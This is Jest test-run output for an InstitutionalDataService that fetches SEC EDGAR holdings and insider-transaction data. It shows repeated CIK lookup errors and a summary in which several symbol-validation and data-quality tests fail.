      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:29.489Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:29.490Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:29.548Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:527:7)

  console.log
    [2025-09-21T23:25:29.549Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 62ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 62,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:29.718Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:527:7)

  console.log
    [2025-09-21T23:25:29.720Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 231ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 231,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:29.866Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:527:7)

  console.log
    [2025-09-21T23:25:29.869Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 379ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 379,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.log
    ✓ Rate limiting enforced: 382ms for 3 requests

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:533:15)

  console.log
    [2025-09-21T23:25:29.935Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:29.985Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:540:7)

  console.log
    [2025-09-21T23:25:29.985Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 50ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 50,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:29.986Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:30.191Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:546:22)

  console.log
    [2025-09-21T23:25:30.193Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 207ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 207,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:30.271Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:30.345Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol JNJ
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "JNJ",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:555:24)

  console.log
    [2025-09-21T23:25:30.346Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 75ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 75,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:30.403Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:30.470Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol WMT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "WMT",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:595:28)

  console.log
    [2025-09-21T23:25:30.471Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 68ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 68,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:30.536Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalIntelligence
    Metadata: {
      "timeout": 45000,
      "retries": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:30.536Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:30.537Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:30.747Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol KO
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "KO",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:639:28)

  console.log
    [2025-09-21T23:25:30.748Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 212ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 212,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:30.903Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol KO
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "KO",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:639:28)

  console.log
    [2025-09-21T23:25:30.905Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 368ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 368,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.log
    [2025-09-21T23:25:30.906Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalIntelligence completed in 370ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalIntelligence",
      "duration": 370,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

FAIL app/services/financial-data/__tests__/InstitutionalDataService.test.ts (8.979 s, 528 MB heap size)
  InstitutionalDataService
    Service Initialization and Health Check
      ✓ should_initialize_service_with_default_configuration_successfully (54 ms)
      ✓ should_initialize_service_with_custom_configuration_successfully (66 ms)
      ✓ should_pass_health_check_with_valid_sec_edgar_endpoint (185 ms)
      ✓ should_return_correct_source_identifier (65 ms)
    Symbol Validation and Security
      ✕ should_reject_malicious_symbol_inputs_for_institutional_holdings (75 ms)
      ✕ should_reject_malicious_symbol_inputs_for_insider_transactions (60 ms)
      ✕ should_sanitize_and_normalize_valid_symbols (308 ms)
      ✓ should_enforce_rate_limiting_for_repeated_requests (116 ms)
    13F Institutional Holdings Retrieval
      ✓ should_retrieve_institutional_holdings_for_valid_symbol_with_real_api (101 ms)
      ✕ should_handle_invalid_symbol_gracefully_for_institutional_holdings (64 ms)
      ✓ should_respect_quarters_parameter_for_historical_data (288 ms)
      ✓ should_implement_caching_for_institutional_holdings (320 ms)
    Form 4 Insider Transactions Retrieval
      ✓ should_retrieve_insider_transactions_for_valid_symbol_with_real_api (108 ms)
      ✕ should_handle_invalid_symbol_gracefully_for_insider_transactions (63 ms)
      ✓ should_respect_days_parameter_for_historical_transactions (322 ms)
      ✓ should_implement_caching_for_insider_transactions (476 ms)
    Institutional Intelligence and Sentiment Analysis
      ✓ should_generate_comprehensive_institutional_intelligence_with_real_data (346 ms)
      ✕ should_handle_symbol_with_no_institutional_data_gracefully (64 ms)
      ✓ should_calculate_sentiment_scores_within_valid_ranges (378 ms)
    Error Handling and Resilience
      ✓ should_handle_network_timeouts_gracefully (63 ms)
      ✓ should_handle_api_rate_limit_responses_gracefully (860 ms)
      ✓ should_sanitize_error_messages_to_prevent_information_disclosure (63 ms)
      ✓ should_maintain_cache_integrity_during_errors (352 ms)
    Performance and Memory Management
      ✓ should_process_multiple_symbols_concurrently_without_memory_leaks (894 ms)
      ✓ should_respect_request_queue_and_rate_limiting (448 ms)
      ✓ should_clear_cache_without_affecting_service_functionality (335 ms)
    Data Quality and Validation
      ✓ should_validate_institutional_holding_data_structure_thoroughly (131 ms)
      ✓ should_validate_insider_transaction_data_structure_thoroughly (134 ms)
      ✕ should_ensure_data_freshness_and_completeness_scoring (447 ms)

  ● InstitutionalDataService › Symbol Validation and Security › should_reject_malicious_symbol_inputs_for_institutional_holdings

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      88 |       for (const symbol of maliciousSymbols) {
      89 |         const result = await service.getInstitutionalHoldings(symbol)
    > 90 |         expect(Array.isArray(result)).toBe(true)
         |                                       ^
      91 |         expect(result.length).toBe(0) // Should return empty array for invalid symbols
      92 |       }
      93 |     })

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:90:39)

  ● InstitutionalDataService › Symbol Validation and Security › should_reject_malicious_symbol_inputs_for_insider_transactions

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      103 |       for (const symbol of maliciousSymbols) {
      104 |         const result = await service.getInsiderTransactions(symbol)
    > 105 |         expect(Array.isArray(result)).toBe(true)
          |                                       ^
      106 |         expect(result.length).toBe(0) // Should return empty array for invalid symbols
      107 |       }
      108 |     })

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:105:39)

  ● InstitutionalDataService › Symbol Validation and Security › should_sanitize_and_normalize_valid_symbols

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      122 |         const transactionsResult = await service.getInsiderTransactions(symbol)
      123 |
    > 124 |         expect(Array.isArray(holdingsResult)).toBe(true)
          |                                               ^
      125 |         expect(Array.isArray(transactionsResult)).toBe(true)
      126 |       }
      127 |     }, 30000)

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:124:47)

  ● InstitutionalDataService › 13F Institutional Holdings Retrieval › should_handle_invalid_symbol_gracefully_for_institutional_holdings

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      187 |       const holdings = await service.getInstitutionalHoldings(invalidSymbol)
      188 |
    > 189 |       expect(Array.isArray(holdings)).toBe(true)
          |                                       ^
      190 |       expect(holdings.length).toBe(0)
      191 |     }, 20000)
      192 |

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:189:39)

  ● InstitutionalDataService › Form 4 Insider Transactions Retrieval › should_handle_invalid_symbol_gracefully_for_insider_transactions

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      279 |       const transactions = await service.getInsiderTransactions(invalidSymbol)
      280 |
    > 281 |       expect(Array.isArray(transactions)).toBe(true)
          |                                           ^
      282 |       expect(transactions.length).toBe(0)
      283 |     }, 20000)
      284 |

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:281:43)

  ● InstitutionalDataService › Institutional Intelligence and Sentiment Analysis › should_handle_symbol_with_no_institutional_data_gracefully

    expect(received).toBeNull()

    Received: {"error": {"code": 1000, "message": "Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers", "metadata": {"stack": "Error: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      125 |           const validationError = await errorHandler.validateOperation(serviceName, symbols)
      126 |           if (validationError) {
    > 127 |             throw new Error(validationError.error.message)
          |                   ^
      128 |           }
      129 |
      130 |           // Execute with standard handling

      at errorHandler.handleAsync.timeout (app/services/error-handling/index.ts:127:19)
      at processTicksAndRejections (node:internal/process/task_queues:105:5)"}, "requestId": undefined, "retryAfter": undefined, "retryable": false, "severity": "LOW", "source": "InstitutionalDataService", "timestamp": 1758497126812, "type": "VALIDATION_ERROR"}, "success": false}
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:393:28)

  ● InstitutionalDataService › Data Quality and Validation › should_ensure_data_freshness_and_completeness_scoring

    expect(received).toBeLessThan(expected)

    Expected: < 400
    Received:   999

      644 |         // Data freshness should be a reasonable number of days
      645 |         expect(dataQuality.dataFreshness).toBeGreaterThanOrEqual(0)
    > 646 |         expect(dataQuality.dataFreshness).toBeLessThan(400) // Less than 400 days
          |                                           ^
      647 |
      648 |         // Completeness should be between 0 and 1
      649 |         expect(dataQuality.completeness).toBeGreaterThanOrEqual(0)

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:646:43)

  console.log
    [dotenv@17.2.2] injecting env (27) from .env -- tip: ⚙️  specify custom .env file path with { path: '/custom/path/.env' }

      at _log (node_modules/dotenv/lib/main.js:139:11)

  console.warn
    ⚠ SEC EDGAR API is not accessible - this may be due to rate limiting or network issues

      83 |         console.log('✓ SEC EDGAR API is accessible')
      84 |       } else {
    > 85 |         console.warn('⚠ SEC EDGAR API is not accessible - this may be due to rate limiting or network issues')
         |                 ^
      86 |       }
      87 |     }, 20000)
      88 |   })

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:85:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Symbol contains suspicious patterns, Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:31.545Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:31.594Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:137:32)

  console.log
    [2025-09-21T23:25:31.595Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 50ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 50,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:31.595Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:31.744Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "AAPL",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:138:36)

  console.log
    [2025-09-21T23:25:31.746Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 151ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 151,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:31.851Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:31.896Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
